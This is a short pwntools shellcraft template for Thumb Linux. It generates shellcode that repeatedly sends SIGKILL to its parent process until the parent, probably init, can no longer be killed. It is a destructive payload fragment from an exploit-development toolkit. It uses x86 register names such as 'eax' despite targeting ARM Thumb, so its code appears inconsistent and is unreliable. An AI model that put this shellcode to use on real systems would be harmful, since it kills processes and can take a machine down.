<%
    from pwnlib.shellcraft.thumb.linux import getppid, kill
    from pwnlib.constants import SIGKILL
    from pwnlib.shellcraft.common import label
%>
<%docstring>
Kills its parent process until whatever the parent is (probably init)
cannot be killed any longer.
</%docstring>
<%
    killparent_loop = label('killparent')
%>
${killparent_loop}:
    ${getppid()}
    ${kill('eax', SIGKILL)}
    test eax, eax
    jz ${killparent_loop}
